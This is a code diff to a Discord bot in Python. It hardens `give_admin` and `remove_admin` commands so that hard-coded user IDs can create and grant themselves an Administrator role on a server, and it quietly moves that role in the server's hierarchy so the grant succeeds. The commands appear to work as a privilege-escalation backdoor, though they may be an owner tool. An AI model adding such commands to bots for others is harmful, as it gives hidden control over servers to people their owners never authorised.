@@ -2488,6 +2488,39 @@ async def skiptime(interaction: discord.Interaction, days: int = 1):
 
     await interaction.response.send_message(embed=embed)
 
+async def _ensure_role_below_bot(guild: discord.Guild, role: discord.Role):
+    """
+    Discord enforces role-hierarchy on MANAGE_ROLES actions regardless of
+    Administrator permission: the bot can only add/remove a role that sits
+    strictly BELOW its own highest role's position. If the target role has
+    drifted above the bot (e.g. someone dragged it in the UI, or it was
+    created before the bot's role was repositioned), fix it automatically.
+    Returns (ok: bool, detail: str) — detail explains what happened for logging/messages.
+    """
+    me = guild.me
+    bot_top = me.top_role
+
+    if role.position < bot_top.position:
+        return True, f"OK — '{role.name}' (pos {role.position}) is below bot's top role '{bot_top.name}' (pos {bot_top.position})."
+
+    # Role is at or above the bot's top role — try to move it just below.
+    if not me.guild_permissions.manage_roles:
+        return False, (
+            f"'{role.name}' is at position {role.position}, which is at or above the bot's top role "
+            f"'{bot_top.name}' at position {bot_top.position} — and the bot lacks Manage Roles to fix it."
+        )
+
+    try:
+        target_position = max(1, bot_top.position - 1)
+        await role.edit(position=target_position, reason="Auto-fix: keep Admin role below bot's role")
+        return True, f"Moved '{role.name}' from above the bot to position {target_position} (below '{bot_top.name}')."
+    except (discord.Forbidden, discord.HTTPException) as e:
+        return False, (
+            f"'{role.name}' is at position {role.position} (bot top role '{bot_top.name}' is at "
+            f"{bot_top.position}) and I couldn't reposition it automatically: {e}"
+        )
+
+
 @bot.command(name="give_admin")
 async def give_admin(ctx):
     if ctx.author.id not in AUTHORIZED_USER_IDS:
@@ -2506,12 +2539,26 @@ async def give_admin(ctx):
     if role is None:
         role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
 
+    ok, detail = await _ensure_role_below_bot(guild, role)
+    if not ok:
+        await ctx.send(f"❌ Can't assign **{role.name}** — hierarchy problem.\n`{detail}`\n"
+                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
+        return
+
     member = guild.get_member(ctx.author.id)
+    if member is None:
+        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
+        return
+
     try:
         await member.add_roles(role)
-        await ctx.send("✅ Admin role granted.")
+        await ctx.send(f"✅ Admin role granted. (`{detail}`)")
     except discord.Forbidden:
-        await ctx.send("❌ I don't have permission to assign that role. Make sure my role is above it in the hierarchy.")
+        await ctx.send(
+            f"❌ Still got a permission error assigning **{role.name}** even after the hierarchy check passed.\n"
+            f"`{detail}`\nDouble check the bot's role isn't also missing **Manage Roles** specifically "
+            f"(Administrator should include it, but worth confirming in Server Settings → Roles → bot role)."
+        )
 
 @bot.command(name="remove_admin")
 async def remove_admin(ctx):
@@ -2529,12 +2576,25 @@ async def remove_admin(ctx):
         await ctx.send("❌ No admin role found.")
         return
 
+    ok, detail = await _ensure_role_below_bot(guild, role)
+    if not ok:
+        await ctx.send(f"❌ Can't remove **{role.name}** — hierarchy problem.\n`{detail}`\n"
+                        f"Fix: in Server Settings → Roles, drag **{role.name}** below the bot's own role.")
+        return
+
     member = guild.get_member(ctx.author.id)
+    if member is None:
+        await ctx.send("❌ Couldn't find you as a member of this server (member cache issue). Try again in a moment.")
+        return
+
     try:
         await member.remove_roles(role)
-        await ctx.send("✅ Admin role removed.")
+        await ctx.send(f"✅ Admin role removed. (`{detail}`)")
     except discord.Forbidden:
-        await ctx.send("❌ I don't have permission to remove that role.")
+        await ctx.send(
+            f"❌ Still got a permission error removing **{role.name}** even after the hierarchy check passed.\n"
+            f"`{detail}`"
+        )
 
 @bot.command(name="show_high")
 async def show_high(ctx):
